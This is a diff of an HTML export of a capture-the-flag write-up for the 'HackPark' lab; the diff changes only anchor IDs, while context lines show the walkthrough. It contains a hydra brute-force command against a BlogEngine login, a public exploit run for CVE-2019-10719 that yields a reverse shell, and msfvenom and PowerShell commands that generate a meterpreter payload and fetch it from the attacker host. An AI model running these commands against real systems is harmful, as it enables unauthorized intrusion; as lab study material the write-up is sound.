@@ -22,19 +22,19 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgbb6c9f2">Recon</a>
+<li><a href="#org0473057">Recon</a>
 <ul>
-<li><a href="#org38cc919">Visiting the WebServer</a></li>
+<li><a href="#org89a9daf">Visiting the WebServer</a></li>
 </ul>
 </li>
-<li><a href="#org5897535">Bruteforcing the website log in</a></li>
-<li><a href="#orgbf8625c">Exploiting BlogEngine</a></li>
-<li><a href="#org5cd2851">PrivEsc</a>
+<li><a href="#org9659240">Bruteforcing the website log in</a></li>
+<li><a href="#org1ffb9e3">Exploiting BlogEngine</a></li>
+<li><a href="#org12d5d64">PrivEsc</a>
 <ul>
-<li><a href="#orgb70e1e8">Meterpreter</a></li>
+<li><a href="#org29b152b">Meterpreter</a></li>
 </ul>
 </li>
-<li><a href="#orge08ec1c">Conclusion</a></li>
+<li><a href="#orgd72f230">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -51,9 +51,9 @@ After using the good ol trick of modifying <code>/etc/hosts</code> and <code>.ba
 easier handling of the remote machine&rsquo;s address:
 </p>
 
-<div id="outline-container-orgbb6c9f2" class="outline-2">
-<h2 id="orgbb6c9f2"><a href="#orgbb6c9f2">Recon</a></h2>
-<div class="outline-text-2" id="text-orgbb6c9f2">
+<div id="outline-container-org0473057" class="outline-2">
+<h2 id="org0473057"><a href="#org0473057">Recon</a></h2>
+<div class="outline-text-2" id="text-org0473057">
 <p>
 Our initial port scan only shows 2 open ports:
 </p>
@@ -63,7 +63,7 @@ Our initial port scan only shows 2 open ports:
 results suggest may be an RDP entry point)</li>
 </ul>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgb8af9a4">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="org9fc0527">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 
@@ -77,9 +77,9 @@ revealed:
 </ul>
 </div>
 
-<div id="outline-container-org38cc919" class="outline-3">
-<h3 id="org38cc919"><a href="#org38cc919">Visiting the WebServer</a></h3>
-<div class="outline-text-3" id="text-org38cc919">
+<div id="outline-container-org89a9daf" class="outline-3">
+<h3 id="org89a9daf"><a href="#org89a9daf">Visiting the WebServer</a></h3>
+<div class="outline-text-3" id="text-org89a9daf">
 <p>
 The website is powered by <code>BlogEngine</code>, with numerous exploits readily
 available for certain versions of it in exploitdb.
@@ -88,7 +88,7 @@ available for certain versions of it in exploitdb.
 <p>
 <code>robots.txt</code> has some nice directories:
 </p>
-<pre class="example" id="orge530822">
+<pre class="example" id="org153c397">
 User-agent: *
 Disallow: /Account/*.*
 Disallow: /search
@@ -102,7 +102,7 @@ Disallow: /archive.aspx
 We have a contact form, so a XSS vulnerability could (maybe) be used
 </p>
 
-<div id="org585310f" class="figure">
+<div id="org353374d" class="figure">
 <p><img src="images/Recon/20231215_000936_screenshot.png" alt="20231215_000936_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 1: </span>Contact form</p>
@@ -112,7 +112,7 @@ We have a contact form, so a XSS vulnerability could (maybe) be used
 We also have a log in form:
 </p>
 
-<div id="org4314cc2" class="figure">
+<div id="orgb874319" class="figure">
 <p><img src="images/Recon/20231215_001129_screenshot.png" alt="20231215_001129_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 2: </span>Log in form</p>
@@ -127,9 +127,9 @@ am looking at.
 </div>
 </div>
 
-<div id="outline-container-org5897535" class="outline-2">
-<h2 id="org5897535"><a href="#org5897535">Bruteforcing the website log in</a></h2>
-<div class="outline-text-2" id="text-org5897535">
+<div id="outline-container-org9659240" class="outline-2">
+<h2 id="org9659240"><a href="#org9659240">Bruteforcing the website log in</a></h2>
+<div class="outline-text-2" id="text-org9659240">
 <p>
 After redirecting my web traffic to burp, so that I can better see how
 my post requests are structured, it becomes apparrent that there is a
@@ -137,7 +137,7 @@ set of parameters (other than just username and password) I need to
 set:
 </p>
 
-<pre class="example" id="org92cd6ed">
+<pre class="example" id="orgdba120c">
 __VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
 </pre>
 
@@ -147,7 +147,7 @@ path <code>/Account/login.aspx</code> and failed login attempts had <code>Login 
 I structured the following hydra command:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org5c75081">hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form <span class="org-string">"/Account/login.aspx:__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> 
+<pre class="src src-bash" id="orgec051c5">hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form <span class="org-string">"/Account/login.aspx:__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> 
 </pre>
 </div>
 
@@ -157,9 +157,9 @@ After waiting for some time, it gave us the password.
 </div>
 </div>
 
-<div id="outline-container-orgbf8625c" class="outline-2">
-<h2 id="orgbf8625c"><a href="#orgbf8625c">Exploiting BlogEngine</a></h2>
-<div class="outline-text-2" id="text-orgbf8625c">
+<div id="outline-container-org1ffb9e3" class="outline-2">
+<h2 id="org1ffb9e3"><a href="#org1ffb9e3">Exploiting BlogEngine</a></h2>
+<div class="outline-text-2" id="text-org1ffb9e3">
 <p>
 Seeing that BlogEngine had some exploits available, I immediately
 searched for the currently running version, (available in the <code>about</code>
@@ -167,7 +167,7 @@ pane).
 </p>
 
 
-<div id="orgcd67317" class="figure">
+<div id="orgca92a74" class="figure">
 <p><img src="images/Exploiting_BlogEngine/20231215_003106_screenshot.png" alt="20231215_003106_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 3: </span>Blog Engine Version</p>
@@ -179,7 +179,7 @@ available python scripts for us to use (much better than the manual
 alternative :P ):
 </p>
 
-<pre class="example" id="orgf34134c">
+<pre class="example" id="orgd96e504">
 BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Direct | aspx/webapps/47010.py
 BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' D | aspx/webapps/47011.py
 </pre>
@@ -190,7 +190,7 @@ same author and essentially have a similar behavior. I decided to go
 with the first one.
 </p>
 
-<pre class="example" id="org7a68ceb">
+<pre class="example" id="org5771ab6">
 Exploit for CVE-2019-10719
 
 CVE Identified by: Aaron Bishop
@@ -210,7 +210,7 @@ This, taken from the exploit file (obviously), served as the basis for
 the following command
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org328a7ee">searchsploit -m 47010 <span class="org-comment-delimiter"># </span><span class="org-comment">this might be just the most beautiful option in searchsploit, which I had *totally* missed for quite a long time</span>
+<pre class="src src-bash" id="org400b940">searchsploit -m 47010 <span class="org-comment-delimiter"># </span><span class="org-comment">this might be just the most beautiful option in searchsploit, which I had *totally* missed for quite a long time</span>
 python 47010.py -t hackpark.thm -l 10.10.93.209:6969 -u admin -p 1qaz2wsx
 </pre>
 </div>
@@ -224,7 +224,7 @@ nice reverse shell.
 
 
 
-<div id="org7f402e8" class="figure">
+<div id="orga2ace7b" class="figure">
 <p><img src="images/Exploiting_BlogEngine/20231215_004446_screenshot.png" alt="20231215_004446_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 4: </span>Initial Foothold</p>
@@ -238,23 +238,23 @@ getting a meterpreter shell, there is no need for manual priv esc.
 </div>
 </div>
 
-<div id="outline-container-org5cd2851" class="outline-2">
-<h2 id="org5cd2851"><a href="#org5cd2851">PrivEsc</a></h2>
-<div class="outline-text-2" id="text-org5cd2851">
+<div id="outline-container-org12d5d64" class="outline-2">
+<h2 id="org12d5d64"><a href="#org12d5d64">PrivEsc</a></h2>
+<div class="outline-text-2" id="text-org12d5d64">
 <p>
 This section could be called &ldquo;getting the flags&rdquo;, because I do not
 believe that I would go 
 </p>
 </div>
 
-<div id="outline-container-orgb70e1e8" class="outline-3">
-<h3 id="orgb70e1e8"><a href="#orgb70e1e8">Meterpreter</a></h3>
-<div class="outline-text-3" id="text-orgb70e1e8">
+<div id="outline-container-org29b152b" class="outline-3">
+<h3 id="org29b152b"><a href="#org29b152b">Meterpreter</a></h3>
+<div class="outline-text-3" id="text-org29b152b">
 <p>
 First things first, generating and uploading the payload to the target
 host:
 </p>
-<pre class="example" id="org6891ef1">
+<pre class="example" id="org6d25c86">
 root@ip-10-10-93-209:~# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.93.209 LPORT=6970
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -281,12 +281,12 @@ in that position make sure that you are smarter than me: pressing
 https instead of http by habit.
 </p>
 
-<pre class="example" id="org6c78a67">
+<pre class="example" id="org0a6f8ec">
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.93.209:8000/shell.exe' -OutFile 'c:\Windows\Temp\shell.exe'"
 </pre>
 
 
-<div id="org4e32008" class="figure">
+<div id="orgc023a2a" class="figure">
 <p><img src="images/PrivEsc/20231215_012431_screenshot.png" alt="20231215_012431_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 5: </span>Meterpreter</p>
@@ -313,9 +313,9 @@ session. Maybe next time.
 </div>
 
 
-<div id="outline-container-orge08ec1c" class="outline-2">
-<h2 id="orge08ec1c"><a href="#orge08ec1c">Conclusion</a></h2>
-<div class="outline-text-2" id="text-orge08ec1c">
+<div id="outline-container-orgd72f230" class="outline-2">
+<h2 id="orgd72f230"><a href="#orgd72f230">Conclusion</a></h2>
+<div class="outline-text-2" id="text-orgd72f230">
 <p>
 I will focus on getting some more experience with windows, at least on
 a theoretical level, and populating my notes better, because I think
